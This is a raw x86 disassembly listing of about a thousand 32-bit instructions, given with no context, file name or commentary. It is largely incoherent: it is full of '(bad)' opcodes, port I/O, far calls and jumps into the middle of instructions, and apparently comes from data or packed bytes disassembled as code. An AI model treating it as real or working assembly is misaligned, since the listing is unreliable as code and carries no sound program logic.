  4082df:	xchg   BYTE PTR [ebp-0x64f0b3a],ah
  4082e5:	cmc    
  4082e6:	lods   al,BYTE PTR ds:[esi]
  4082e7:	sbb    al,0xee
  4082e9:	je     0x408309
  4082eb:	imul   ebp,DWORD PTR [ecx+0x67],0x2f
  4082ef:	sub    BYTE PTR [ecx-0x7e4dba6f],ah
  4082f5:	loop   0x40835e
  4082f7:	push   ebp
  4082f8:	arpl   WORD PTR [ebp-0x51],dx
  4082fb:	mov    dl,0xb6
  4082fd:	(bad)  
  4082fe:	mov    esp,0x6b00a369
  408303:	adc    BYTE PTR [edi+0xf],bl
  408306:	not    edx
  408308:	fwait
  408309:	sar    BYTE PTR [eax-0x3ed4051e],cl
  40830f:	(bad)  [ebp-0x29]
  408312:	into   
  408313:	fldenv [ebx+0x3a86a7e8]
  408319:	jmp    0x798b0f78
  40831e:	in     eax,0xa6
  408320:	pusha  
  408321:	push   edi
  408322:	cmp    BYTE PTR [edi+0x33],dl
  408325:	mov    bh,0x81
  408327:	adc    BYTE PTR [edx-0x40576177],al
  40832d:	xchg   edx,ebx
  40832f:	add    ecx,DWORD PTR [edx+0x24]
  408332:	mov    DWORD PTR [ecx],ecx
  408334:	into   
  408335:	and    DWORD PTR [ebp+0x4dbf8c26],esi
  40833b:	lahf   
  40833c:	sub    eax,0xdaa290da
  408341:	jp     0x40830d
  408343:	push   es
  408344:	dec    ecx
  408345:	aam    0x31
  408347:	and    DWORD PTR ds:0xaa44c833,ebx
  40834d:	test   eax,0x91142303
  408352:	jle    0x4082d9
  408354:	sbb    edx,DWORD PTR [esi]
  408356:	repnz fist WORD PTR [esi]
  408359:	xchg   ebp,eax
  40835a:	ret    
  40835b:	mov    al,ds:0xe0c44135
  408360:	pop    es
  408361:	es jecxz 0x4082f0
  408364:	rcr    DWORD PTR [ebx+0x68],1
  408367:	scas   eax,DWORD PTR es:[edi]
  408368:	dec    esp
  408369:	add    edi,DWORD PTR [ebp-0x4aaef8b0]
  40836f:	shr    DWORD PTR [ecx],0xea
  408372:	cmp    eax,0x317a09d1
  408377:	and    BYTE PTR [ecx+0x47fbd414],ah
  40837d:	xchg   edx,eax
  40837e:	dec    ebx
  40837f:	mov    dl,0x34
  408381:	adc    al,BYTE PTR [edi+0x7707e212]
  408387:	mov    DWORD PTR [ebx],esi
  408389:	leave  
  40838a:	sub    BYTE PTR [ebp-0x28],dh
  40838d:	(bad)  
  40838e:	jne    0x40832c
  408390:	jecxz  0x408333
  408392:	or     esp,edx
  408394:	and    esi,DWORD PTR [esi+0x199adb20]
  40839a:	mov    edx,0xb5fe0429
  40839f:	mov    esp,0xc2a0e563
  4083a4:	lods   eax,DWORD PTR ds:[esi]
  4083a5:	sbb    edx,DWORD PTR [esi-0x27]
  4083a8:	adc    DWORD PTR [edi-0x1fbb0e21],edi
  4083ae:	ja     0x408394
  4083b0:	push   ecx
  4083b1:	test   DWORD PTR [ecx+0x13],edx
  4083b4:	loope  0x4083e9
  4083b6:	cs call 0x3279:0xafa583de
  4083be:	or     DWORD PTR [eax+ebx*1],ebp
  4083c1:	jbe    0x408392
  4083c3:	scas   eax,DWORD PTR es:[edi]
  4083c4:	xor    al,0x1b
  4083c6:	sahf   
  4083c7:	loop   0x408377
  4083c9:	mov    esi,0x5f36984c
  4083ce:	xchg   BYTE PTR [edx],cl
  4083d0:	mov    ah,0xc
  4083d2:	jg     0x40841f
  4083d4:	clc    
  4083d5:	int    0x59
  4083d7:	and    cl,bh
  4083d9:	shl    BYTE PTR [esi+0x5b],cl
  4083dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083dd:	mov    eax,ds:0xcc34d617
  4083e2:	stos   DWORD PTR es:[edi],eax
  4083e3:	fstp   QWORD PTR ds:0xfa9a5a37
  4083e9:	shr    BYTE PTR [ecx+0x59],1
  4083ec:	aas    
  4083ed:	retf   0x47f6
  4083f0:	sbb    esi,DWORD PTR [edi+0x78de462]
  4083f6:	pop    esi
  4083f7:	and    eax,0x579c092
  4083fc:	pop    ecx
  4083fd:	push   ebp
  4083fe:	loop   0x4083c7
  408400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408401:	pop    es
  408402:	mov    dh,0x57
  408404:	(bad)
  408407:	ret    0x4631
  40840a:	(bad)  
  40840c:	mov    esp,DWORD PTR [ebx+edi*2+0x17]
  408410:	dec    edi
  408411:	mov    BYTE PTR [ebp+0x47],dh
  408414:	(bad)  
  408415:	pop    ecx
  408416:	cmp    BYTE PTR [edi+0x63],0xcc
  40841a:	lahf   
  40841b:	loop   0x40848e
  40841d:	je     0x4083ba
  40841f:	pop    ss
  408420:	dec    edx
  408421:	xlat   BYTE PTR ds:[ebx]
  408422:	dec    esi
  408423:	ret    
  408424:	das    
  408425:	rol    BYTE PTR [ebp+0x19],cl
  408428:	sbb    DWORD PTR [esp+edi*8],esp
  40842b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40842c:	or     edx,DWORD PTR [ebx]
  40842e:	out    0x10,al
  408430:	retf   0x13cb
  408433:	gs inc edx
  408435:	xchg   DWORD PTR [ebx+0x32527d28],edi
  40843b:	mov    cl,0x8d
  40843d:	bound  ebp,QWORD PTR [ebx+edi*4]
  408440:	sbb    esi,DWORD PTR [edx-0x6b]
  408443:	sahf   
  408444:	sahf   
  408445:	sbb    edi,DWORD PTR [esi-0xff60292]
  40844b:	mov    bh,0xa7
  40844d:	or     eax,0x2f659b42
  408452:	dec    esp
  408453:	mov    dh,0x53
  408455:	cmp    al,0x6
  408457:	push   ecx
  408458:	and    eax,0xc6da8767
  40845d:	aam    0xb9
  40845f:	shl    BYTE PTR [edx-0x7045628b],0xb4
  408466:	and    DWORD PTR [eax+0x1c],ebx
  408469:	je     0x408497
  40846b:	je     0x4084d0
  40846d:	into   
  40846e:	ds loope 0x4084ed
  408471:	dec    ebp
  408472:	mov    bl,0x2b
  408474:	mov    ds:0x58751740,eax
  408479:	dec    esi
  40847a:	dec    esi
  40847b:	repnz sub eax,0xd2efaa33
  408481:	jae    0x4084c1
  408483:	or     al,0xf6
  408485:	push   ecx
  408486:	in     al,dx
  408487:	jmp    0xe8f0c9ca
  40848c:	fmul   QWORD PTR [edx-0x5aee774e]
  408492:	push   esp
  408493:	mov    DWORD PTR [eax+0x3d],0x9b3de719
  40849a:	xchg   esp,eax
  40849b:	push   cs
  40849c:	and    eax,0xc9369fd9
  4084a1:	(bad)  
  4084a2:	ja     0x408473
  4084a4:	sbb    BYTE PTR [edx],bl
  4084a6:	nop
  4084a7:	outs   dx,BYTE PTR ds:[esi]
  4084a8:	test   eax,0xc55aedc
  4084ad:	dec    edi
  4084ae:	mov    bh,0x8a
  4084b0:	aaa    
  4084b1:	jle    0x4084d8
  4084b3:	mov    cl,0x4
  4084b5:	aaa    
  4084b6:	(bad)
  4084b9:	xor    eax,DWORD PTR [edx-0x40780983]
  4084bf:	dec    ebp
  4084c0:	cmp    eax,0xd72a6385
  4084c5:	pushf  
  4084c6:	dec    esi
  4084c7:	mov    edx,0x6ed5fcf6
  4084cc:	ret    0x2e00
  4084cf:	imul   eax,DWORD PTR ss:[edi],0xb25b1941
  4084d6:	add    DWORD PTR [ebx-0x25],edi
  4084d9:	bound  ebp,QWORD PTR [esi-0x63]
  4084dc:	pushf  
  4084dd:	mov    al,BYTE PTR [ebx+eax*2+0x44]
  4084e1:	sbb    BYTE PTR [ecx+0x2f580604],0x4f
  4084e8:	hlt    
  4084e9:	call   0x23c78e4f
  4084ee:	sub    esi,DWORD PTR [esi+edi*2]
  4084f1:	pusha  
  4084f2:	jmp    0xc429:0xf3296c26
  4084f9:	or     eax,0x2cc722f1
  4084fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084ff:	in     eax,dx
  408500:	loope  0x408558
  408502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408504:	and    edi,DWORD PTR ds:0xf57f9fde
  40850a:	(bad)  
  40850b:	clc    
  40850c:	jge    0x40856e
  40850e:	dec    edi
  40850f:	sahf   
  408510:	(bad)  
  408511:	fsubrp st(0),st
  408513:	lods   eax,DWORD PTR ds:[esi]
  408514:	xchg   ecx,eax
  408515:	cmp    BYTE PTR [ecx],ch
  408517:	xchg   edi,eax
  408518:	xlat   BYTE PTR ds:[ebx]
  408519:	xor    bl,0x21
  40851c:	jg     0x408507
  40851e:	pop    eax
  40851f:	in     al,0x6f
  408521:	adc    eax,0x7607afe8
  408526:	adc    al,0xe5
  408528:	lea    ebx,[esi-0x283beeaa]
  40852e:	loopne 0x408550
  408530:	and    BYTE PTR ds:0x9a4b5d64,ah
  408536:	jnp    0x408580
  408538:	push   ebx
  408539:	dec    edx
  40853a:	adc    eax,0x107509d7
  40853f:	push   ss
  408540:	or     esi,ecx
  408542:	aad    0x1
  408544:	pop    edi
  408545:	lods   al,BYTE PTR ds:[esi]
  408546:	push   edx
  408547:	or     cl,BYTE PTR [edi]
  408549:	repnz fs pop ds
  40854c:	add    DWORD PTR [edx-0x7d677871],ebx
  408552:	push   0x5b94cfae
  408557:	jg     0x4085c0
  408559:	dec    edi
  40855a:	in     eax,0x97
  40855c:	call   0xe95aa353
  408561:	mov    bl,0x98
  408563:	inc    esi
  408564:	stos   DWORD PTR es:[edi],eax
  408565:	iret   
  408566:	loop   0x408564
  408568:	cmp    dl,bl
  40856a:	test   DWORD PTR [edi],0x851dac62
  408570:	mov    ebx,esi
  408572:	idiv   BYTE PTR [edx+0x28]
  408575:	loopne 0x4085a9
  408577:	mov    BYTE PTR [eax-0x4b7103ea],cl
  40857d:	(bad)  
  40857e:	das    
  40857f:	outs   dx,BYTE PTR ds:[esi]
  408580:	gs out 0xfb,eax
  408583:	(bad)  
  408584:	mov    ds:0xf507ae16,eax
  408589:	pop    edx
  40858a:	ret    
  40858b:	push   ebp
  40858c:	push   0xffffff9e
  40858e:	daa    
  40858f:	mov    ch,0xa8
  408591:	sub    BYTE PTR [ecx],0xae
  408594:	pop    esi
  408595:	xchg   ecx,eax
  408596:	jne    0x4085d4
  408598:	cdq    
  408599:	out    0x3d,al
  40859b:	call   0x6084:0xbbb7810f
  4085a2:	and    eax,0x3bbcf748
  4085a7:	dec    esp
  4085a8:	ret    0xdabb
  4085ab:	jns    0x408563
  4085ad:	fyl2x  
  4085af:	sub    al,BYTE PTR [edx+eiz*2]
  4085b2:	sbb    al,0x9b
  4085b4:	xchg   esi,eax
  4085b5:	mov    ebp,0x2586b07b
  4085ba:	add    eax,0xbbb144c9
  4085bf:	jne    0x408557
  4085c1:	xchg   ebx,eax
  4085c2:	jp     0x40857b
  4085c4:	out    0xbb,al
  4085c6:	mov    ds:0x4d90c6e7,al
  4085cb:	mov    bh,0xef
  4085cd:	loopne 0x408625
  4085cf:	mov    cl,0x27
  4085d1:	dec    ecx
  4085d2:	ret    0xab89
  4085d5:	pop    ecx
  4085d6:	out    dx,eax
  4085d7:	out    dx,eax
  4085d8:	ret    0x7b91
  4085db:	(bad)  
  4085dc:	add    BYTE PTR fs:[edi],bl
  4085df:	jle    0x4085e5
  4085e1:	in     eax,0x54
  4085e3:	aas    
  4085e4:	in     al,0x1d
  4085e6:	or     al,0xa6
  4085e8:	stos   DWORD PTR es:[edi],eax
  4085e9:	pop    esi
  4085ea:	or     esi,DWORD PTR [ebx]
  4085ec:	xchg   BYTE PTR [edi-0x278125e7],ah
  4085f2:	mov    ebx,0x2d88c550
  4085f7:	(bad)  
  4085f8:	adc    dh,bl
  4085fa:	cli    
  4085fb:	xchg   edi,eax
  4085fc:	ja     0x408612
  4085fe:	jp     0x408653
  408600:	iret   
  408601:	inc    ebp
  408602:	sbb    esi,DWORD PTR [ecx+0x27]
  408605:	push   ss
  408606:	jl     0x4085ea
  408608:	or     al,0x4a
  40860a:	fiadd  WORD PTR [esi]
  40860c:	dec    ebp
  40860d:	mov    dl,ah
  40860f:	call   0xa4b51e3c
  408614:	ret    
  408615:	xlat   BYTE PTR ds:[ebx]
  408616:	out    dx,al
  408617:	fsubrp st(7),st
  408619:	shr    cl,0xfd
  40861c:	lahf   
  40861d:	sub    eax,0x4be5dde3
  408622:	out    0x1d,eax
  408624:	pop    esp
  408625:	imul   eax,DWORD PTR [ebp+0x5fcc302e],0x62
  40862c:	mov    al,0x95
  40862e:	pop    ds
  40862f:	jo     0x408659
  408631:	jb     0x4085e7
  408633:	adc    DWORD PTR [eax-0x6d],eax
  408636:	in     eax,dx
  408637:	mov    esp,0x814d25b0
  40863c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40863e:	lahf   
  40863f:	daa    
  408640:	lahf   
  408641:	push   esi
  408642:	push   ebx
  408643:	dec    esi
  408644:	sbb    eax,0x861d2edc
  408649:	mov    al,ds:0xcabf1dd2
  40864e:	xchg   esp,eax
  40864f:	nop
  408650:	outs   dx,BYTE PTR ds:[esi]
  408651:	mov    ecx,esi
  408653:	push   ss
  408654:	stos   BYTE PTR es:[edi],al
  408655:	push   es
  408656:	test   BYTE PTR [edx+0x5e],0xaa
  40865a:	jnp    0x4086d6
  40865c:	dec    edx
  40865d:	jmp    0x4086ad
  40865f:	in     al,dx
  408660:	add    esp,DWORD PTR [eax-0x436be538]
  408666:	adc    BYTE PTR [edi+0x56],dh
  408669:	mov    ch,0xbb
  40866b:	sti    
  40866c:	shl    DWORD PTR [ebp-0x72b8c915],cl
  408672:	stos   BYTE PTR es:[edi],al
  408673:	push   ebp
  408674:	push   ebp
  408675:	sbb    eax,DWORD PTR [ebx-0x59]
  408678:	call   0x48b8:0x6d10e9ca
  40867f:	imul   DWORD PTR [esi+0x4a81b70]
  408685:	retf   0x604e
  408688:	inc    esi
  408689:	fdivr  QWORD PTR [eax+0x77]
  40868c:	pop    es
  40868d:	dec    esi
  40868e:	js     0x4086b7
  408690:	xchg   esi,eax
  408691:	loope  0x408625
  408693:	retf   0xce7
  408696:	(bad)  
  408697:	mov    bh,BYTE PTR [eax]
  408699:	das    
  40869a:	mov    edi,0x3753e3a8
  40869f:	jns    0x40864d
  4086a1:	jle    0x408633
  4086a3:	mov    dh,0xa3
  4086a5:	shl    BYTE PTR [edx+0x41],1
  4086a8:	and    BYTE PTR [esi+0x1f],ch
  4086ab:	sbb    al,0x74
  4086ad:	dec    ebp
  4086ae:	mov    ebx,0x90034fed
  4086b3:	xchg   DWORD PTR [ecx],edx
  4086b5:	repnz sar dl,1
  4086b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086b9:	cmp    esi,edi
  4086bb:	xlat   BYTE PTR ds:[ebx]
  4086bc:	fild   QWORD PTR [esi]
  4086be:	or     ebp,edi
  4086c0:	dec    edx
  4086c1:	mov    cl,0xa9
  4086c3:	pop    esp
  4086c4:	add    BYTE PTR [esi-0x33],cl
  4086c7:	jns    0x4086ea
  4086c9:	gs dec ebp
  4086cb:	sbb    BYTE PTR [eax],dh
  4086cd:	cdq    
  4086ce:	inc    esi
  4086cf:	cmc    
  4086d0:	xor    dh,ah
  4086d2:	adc    al,0xf1
  4086d4:	mov    bl,0xe8
  4086d6:	ja     0x408667
  4086d8:	xor    BYTE PTR [eax-0x4dadf77f],al
  4086de:	adc    al,0x39
  4086e0:	test   BYTE PTR [eax-0x11],ah
  4086e3:	mov    BYTE PTR [edx-0x77],0x3d
  4086e7:	adc    BYTE PTR [esi-0x78],ah
  4086ea:	fst    DWORD PTR [esi+0x155e18b4]
  4086f0:	aad    0xfa
  4086f2:	pop    esp
  4086f3:	xor    al,0x31
  4086f5:	push   ebx
  4086f6:	jl     0x4086fe
  4086f8:	add    BYTE PTR [esi-0x10],0x15
  4086fc:	mov    eax,0xd58d7b3c
  408701:	sti    
  408702:	es jns 0x4086ca
  408705:	jb     0x4086cf
  408707:	jp     0x408741
  408709:	(bad)  
  40870a:	xor    bh,ch
  40870c:	loopne 0x408726
  40870e:	pop    ebp
  40870f:	fld    st(3)
  408711:	inc    esp
  408712:	dec    ecx
  408713:	xor    eax,0xfadb7c83
  408718:	outs   dx,DWORD PTR ds:[esi]
  408719:	mov    ch,bl
  40871b:	repz pushf 
  40871d:	pop    edx
  40871e:	outs   dx,BYTE PTR ds:[esi]
  40871f:	stos   DWORD PTR es:[edi],eax
  408720:	lea    edx,[ebx+0x4b]
  408723:	out    0x69,al
  408725:	xchg   DWORD PTR [edx],edi
  408727:	sub    eax,0x963cbfda
  40872c:	mov    ds:0x59b91d20,eax
  408731:	stos   DWORD PTR es:[edi],eax
  408732:	xchg   ebx,eax
  408733:	iret   
  408734:	cdq    
  408735:	ds out 0xd1,eax
  408738:	scas   eax,DWORD PTR es:[edi]
  408739:	stos   BYTE PTR es:[edi],al
  40873a:	fwait
  40873b:	loopne 0x4086eb
  40873d:	ds xchg esi,eax
  40873f:	xchg   edx,edx
  408741:	cs cmp eax,0x10a9e91e
  408747:	(bad)  
  408748:	jecxz  0x408725
  40874a:	pop    ecx
  40874b:	jno    0x40872b
  40874d:	stc    
  40874e:	cdq    
  40874f:	sbb    DWORD PTR [edx],esp
  408751:	cmp    eax,DWORD PTR [ebx+0x47]
  408754:	enter  0x904b,0xb9
  408758:	pop    ebp
  408759:	dec    eax
  40875a:	mov    dh,0xda
  40875c:	jno    0x40871a
  40875e:	or     ebx,ecx
  408760:	inc    esi
  408761:	inc    ebp
  408762:	das    
  408763:	sub    al,cl
  408765:	(bad)  
  408766:	mov    ebp,fs
  408768:	in     al,dx
  408769:	sbb    BYTE PTR [esi-0x49e26482],bh
  40876f:	add    eax,0x662e74f1
  408774:	aaa    
  408775:	xchg   ecx,eax
  408776:	les    ebp,FWORD PTR [ebx+0x6aaa243c]
  40877c:	mov    WORD PTR [ecx+0xf5a8849],ss
  408782:	fwait
  408783:	push   es
  408784:	or     DWORD PTR [ebx+0x50],ebp
  408787:	cmp    eax,0x9942d470
  40878c:	test   BYTE PTR [eax+0x20],ah
  40878f:	(bad)  
  408790:	data16 jno 0x4087b9
  408793:	mov    cl,BYTE PTR [eax+0x52]
  408796:	shl    esp,1
  408798:	push   ss
  408799:	jp     0x408818
  40879b:	cmc    
  40879c:	leave  
  40879d:	dec    ebx
  40879e:	addr16 pushf 
  4087a0:	mov    esi,0x306f5e05
  4087a5:	pop    edx
  4087a6:	mov    DWORD PTR [edi-0x29a111c9],eax
  4087ac:	mov    ah,0xb1
  4087ae:	loope  0x408794
  4087b0:	les    edx,FWORD PTR [ebx+0x59]
  4087b3:	loope  0x4087dd
  4087b5:	nop
  4087b6:	inc    eax
  4087b7:	and    al,0x6
  4087b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087ba:	shr    DWORD PTR [edi+0x17],1
  4087bd:	mov    eax,0xb7336bd0
  4087c2:	leave  
  4087c3:	push   edx
  4087c4:	ins    BYTE PTR es:[edi],dx
  4087c5:	fcomip st,st(7)
  4087c7:	push   ss
  4087c8:	ds mov ebp,0xbfbace48
  4087ce:	pushf  
  4087cf:	push   edi
  4087d0:	in     al,0xb6
  4087d2:	jns    0x4087c3
  4087d4:	dec    esi
  4087d5:	xchg   DWORD PTR [ecx+eiz*2+0x37a17a61],edi
  4087dc:	push   0xffffffe8
  4087de:	pop    edx
  4087df:	sbb    DWORD PTR ds:0xf014065f,ebx
  4087e5:	sbb    bl,dl
  4087e7:	push   edx
  4087e8:	fcom   DWORD PTR [edi]
  4087ea:	rol    ah,0xc8
  4087ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ee:	lahf   
  4087ef:	fld    DWORD PTR ss:[esi+0x35]
  4087f4:	int    0x6d
  4087f6:	xchg   BYTE PTR [edi],bl
  4087f8:	add    dl,ch
  4087fa:	mov    DWORD PTR [ebp-0x5a939c9a],esp
  408800:	jecxz  0x408816
  408802:	push   edi
  408803:	push   cs
  408804:	push   ds
  408805:	sub    al,0x6
  408807:	inc    edi
  408808:	jbe    0x4087b8
  40880a:	ror    BYTE PTR [edx],cl
  40880c:	inc    edi
  40880d:	repz sahf 
  40880f:	lock ret 
  408811:	ja     0x408857
  408813:	mov    ebx,0x6bcff2cf
  408818:	rcr    DWORD PTR [edi],0xa9
  40881b:	mov    edx,0x874e0e9
  408820:	cmp    eax,0x3557d2a1
  408825:	xchg   DWORD PTR ds:0xfce5ecf,edi
  40882b:	adc    DWORD PTR [ebx+0x42335280],esi
  408831:	cwde   
  408832:	imul   DWORD PTR [esi+0x7860db9]
  408838:	aam    0x13
  40883a:	jnp    0x408836
  40883c:	popf   
  40883d:	(bad)  
  40883f:	xchg   DWORD PTR [esi-0x52],ecx
  408842:	mov    al,ds:0x3959cd9c
  408847:	jo     0x408840
  408849:	sub    ah,BYTE PTR [edi+eax*2+0x48867af7]
  408850:	xchg   esi,eax
  408851:	mov    ah,0x15
  408853:	add    eax,0x59a4deb7
  408858:	mov    eax,ds:0xeba5b2b
  40885d:	cli    
  40885e:	xchg   esi,eax
  40885f:	mov    edx,0x5a5c4b81
  408864:	aas    
  408865:	addr16 push esp
  408867:	sbb    eax,0x34eac495
  40886c:	lods   al,BYTE PTR ds:[esi]
  40886d:	lock rcl DWORD PTR [ecx+ebp*8-0x3e7f5a03],0x62
  408876:	test   eax,0xa92d962f
  40887b:	fild   DWORD PTR [ebx-0x69d98d92]
  408881:	mov    edi,0x5c25240b
  408886:	(bad)  
  408887:	leave  
  408888:	push   ss
  408889:	or     DWORD PTR [ecx],ecx
  40888b:	mov    dl,0x10
  40888d:	aaa    
  40888e:	in     eax,0x40
  408890:	xor    BYTE PTR [ecx+ebx*8],dl
  408893:	je     0x408849
  408895:	iret   
  408896:	ds mov bh,0xa
  408899:	inc    esp
  40889a:	stc    
  40889b:	outs   dx,DWORD PTR ds:[esi]
  40889c:	test   edx,0xa36fa6ad
  4088a2:	in     al,dx
  4088a3:	mov    ch,0xd0
  4088a5:	sbb    ebx,DWORD PTR [esi+eiz*1+0x7]
  4088a9:	xor    BYTE PTR [eax+eiz*8],ch
  4088ac:	and    al,0x32
  4088ae:	sbb    DWORD PTR [eax+0x40],0x27eacf12
  4088b5:	dec    esi
  4088b6:	add    dh,BYTE PTR ds:0x1520343c
  4088bc:	pop    ebp
  4088bd:	in     al,dx
  4088be:	cmp    al,0xc1
  4088c0:	dec    eax
  4088c1:	icebp  
  4088c2:	mov    ebp,DWORD PTR [ecx]
  4088c4:	aam    0xbd
  4088c6:	sub    DWORD PTR [ebx+0x37],edi
  4088c9:	add    DWORD PTR [ebx],0x63d41c99
  4088cf:	pop    eax
  4088d0:	nop
  4088d1:	icebp  
  4088d2:	dec    esi
  4088d3:	pop    ebx
  4088d4:	je     0x4088ee
  4088d6:	pop    ds
  4088d7:	push   edi
  4088d8:	jbe    0x4088e8
  4088da:	or     bh,BYTE PTR [edx]
  4088dc:	fnstcw WORD PTR [ebx-0x25]
  4088df:	mov    bh,BYTE PTR [ebx-0x751601e6]
  4088e5:	leave  
  4088e6:	jl     0x40890d
  4088e8:	push   cs
  4088e9:	or     BYTE PTR [edx],ah
  4088eb:	into   
  4088ec:	int3   
  4088ed:	je     0x408941
  4088ef:	inc    edx
  4088f0:	and    edx,ebp
  4088f2:	xor    DWORD PTR [edx-0x69],0xbf56d0e5
  4088f9:	and    eax,ebp
  4088fb:	cs mov ah,0x2a
  4088fe:	dec    ebx
  4088ff:	enter  0x48c3,0x28
  408903:	and    DWORD PTR [ebx],edi
  408905:	int3   
  408906:	push   ebx
  408907:	mov    DWORD PTR [esi+edi*8],ebp
  40890a:	inc    esi
  40890b:	dec    eax
  40890c:	daa    
  40890d:	scas   al,BYTE PTR es:[edi]
  40890e:	sub    DWORD PTR [ecx-0x32],esi
  408911:	retf   
  408912:	xchg   ecx,eax
  408913:	pop    es
  408914:	jmp    0x4088ad
  408916:	retf   
  408917:	cli    
  408918:	cli    
  408919:	and    DWORD PTR [edi],0x43da5a22
  40891f:	xor    al,0x44
  408921:	jae    0x4088dd
  408923:	(bad)  
  408924:	lock mov dh,0xf3
  408927:	sub    DWORD PTR [edi],edi
  408929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40892a:	inc    ecx
  40892b:	lods   eax,DWORD PTR ds:[esi]
  40892c:	inc    ecx
  40892d:	mov    DWORD PTR [edx+0x5680bd33],ebx
  408933:	add    ch,BYTE PTR [esi]
  408935:	test   DWORD PTR [ecx+0x55],ebx
  408938:	jge    0x40892f
  40893a:	pop    ebx
  40893b:	dec    ecx
  40893c:	shl    WORD PTR ss:[edx],0x59
  408941:	cmc    
  408942:	xchg   ebp,eax
  408943:	aaa    
  408944:	pop    es
  408945:	aaa    
  408946:	add    al,0x32
  408948:	arpl   WORD PTR [ecx-0x6b],sp
  40894b:	inc    esp
  40894c:	js     0x40896c
  40894e:	adc    BYTE PTR [eax],bl
  408950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408951:	retf   
  408952:	dec    esp
  408953:	mov    ds:0xec28c936,al
  408958:	push   ss
  408959:	mov    ?,WORD PTR [ebx+ebp*1+0x50]
  40895d:	mov    ecx,0x715b7476
  408962:	imul   esi,esp,0xafb81929
  408968:	(bad)  
  408969:	test   eax,0xd433c1c6
  40896e:	jno    0x4088f3
  408970:	into   
  408971:	lds    edx,FWORD PTR [eax+0x5f]
  408974:	inc    esp
  408975:	mov    edi,0x33f6e586
  40897a:	jecxz  0x4089af
  40897c:	push   ebx
  40897d:	xor    al,0x1d
  40897f:	jmp    0xeb41f71d
  408984:	and    al,0xd
  408986:	pop    esi
  408987:	push   ss
  408988:	call   0xeb58:0xbddda2e8
  40898f:	xchg   BYTE PTR [edi+0x4c898494],dl
  408995:	test   eax,0x840705a2
  40899a:	stos   BYTE PTR es:[edi],al
  40899b:	enter  0xeedb,0xa
  40899f:	nop
  4089a0:	test   DWORD PTR [edi],ebx
  4089a2:	mov    ch,0x66
  4089a4:	enter  0xa380,0x8a
  4089a8:	mov    edi,eax
  4089aa:	mov    fs,esp
  4089ac:	xchg   ebp,eax
  4089ad:	into   
  4089ae:	mov    ecx,0xc1a60545
  4089b3:	push   ebx
  4089b4:	pop    eax
  4089b5:	pop    ebx
  4089b6:	rcr    ch,1
  4089b8:	aam    0xbc
  4089ba:	mov    ds:0xa85c1c90,eax
  4089bf:	out    0xc5,eax
  4089c1:	popf   
  4089c2:	add    DWORD PTR [eax-0x168e908f],0x56ec17a2
  4089cc:	das    
  4089cd:	mov    cl,0x43
  4089cf:	loop   0x4089da
  4089d1:	ds inc esp
  4089d3:	jae    0x4089f7
  4089d5:	clc    
  4089d6:	sbb    BYTE PTR [ebx+esi*2],bl
  4089d9:	xchg   esp,eax
  4089da:	pop    ebp
  4089db:	(bad)  
  4089dc:	enter  0xb7b8,0xc3
  4089e0:	cmc    
  4089e1:	aaa    
  4089e2:	ja     0x408986
  4089e4:	ret    
  4089e5:	out    dx,eax
  4089e6:	xor    eax,0x6e6e11d9
  4089eb:	cmp    eax,edx
  4089ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089ee:	and    DWORD PTR [ebx+0x8],eax
  4089f1:	(bad)  
  4089f2:	(bad)  
  4089f3:	repnz sub DWORD PTR [ebp-0x563cc5e3],esp
  4089fa:	mov    ebx,DWORD PTR [esi]
  4089fc:	pop    ds
  4089fd:	in     al,0xd4
  4089ff:	add    eax,0x5a34ade8
  408a04:	sub    BYTE PTR [ecx+0x831719],dl
  408a0a:	shr    DWORD PTR [esi-0x2b],0x37
  408a0e:	pusha  
  408a0f:	jl     0x408a12
  408a11:	fwait
  408a12:	test   BYTE PTR [ecx],ah
  408a14:	pop    ebx
  408a15:	cmp    edx,DWORD PTR [eax-0x10e44e16]
  408a1b:	pop    ecx
  408a1c:	adc    dl,BYTE PTR [ebx+ebx*1-0x3f]
  408a20:	push   ss
  408a21:	mov    BYTE PTR [edx+0x612ff976],ch
  408a27:	add    bh,ah
  408a29:	setp   BYTE PTR [esi-0x72c5f49b]
  408a30:	fisub  DWORD PTR [ecx]
  408a32:	(bad)  
  408a34:	xor    eax,0x2c9a782a
  408a39:	mov    al,0x73
  408a3b:	dec    ecx
  408a3c:	clc    
  408a3d:	cli    
  408a3e:	pop    ss
  408a3f:	jno    0x408a8c
  408a41:	push   edx
  408a42:	xchg   ebp,eax
  408a43:	and    esp,ebp
  408a45:	scas   eax,DWORD PTR es:[edi]
  408a46:	mov    ds:0x866aceb1,eax
  408a4b:	xchg   edi,eax
  408a4c:	xchg   esp,eax
  408a4d:	jne    0x408aa9
  408a4f:	scas   eax,DWORD PTR es:[edi]
  408a50:	aam    0xdf
  408a52:	pop    esi
  408a53:	sbb    ebx,eax
  408a55:	push   ds
  408a56:	(bad)  
  408a57:	xchg   edi,eax
  408a58:	data16 jp 0x408a62
  408a5b:	and    eax,0xe7cce9e7
  408a60:	xor    ah,dl
  408a62:	jne    0x408a20
  408a64:	es popa 
  408a66:	add    DWORD PTR [esi-0x2a],ecx
  408a69:	jb     0x408a9c
  408a6b:	mov    esi,0x8a86685
  408a70:	jg     0x408a76
  408a72:	sub    DWORD PTR [edi-0x7b29be03],eax
  408a78:	arpl   WORD PTR [esi+0x32],sp
  408a7b:	mov    ebx,0x5f7aa1c
  408a80:	push   ss
  408a81:	mov    cl,0xb3
  408a83:	fwait
  408a84:	mov    edx,0xcb7ecda7
  408a89:	dec    BYTE PTR gs:[esi+0x1d03aab2]
  408a90:	xor    BYTE PTR [edx+0x12059668],dl
  408a96:	inc    edx
  408a97:	dec    edx
  408a98:	jnp    0x408a40
  408a9a:	call   0xda3:0xfe4988d7
  408aa1:	push   ecx
  408aa2:	outs   dx,BYTE PTR ds:[esi]
  408aa3:	inc    ebx
  408aa4:	xchg   ebx,eax
  408aa5:	aaa    
  408aa6:	cmp    al,0x19
  408aa8:	or     ecx,ebp
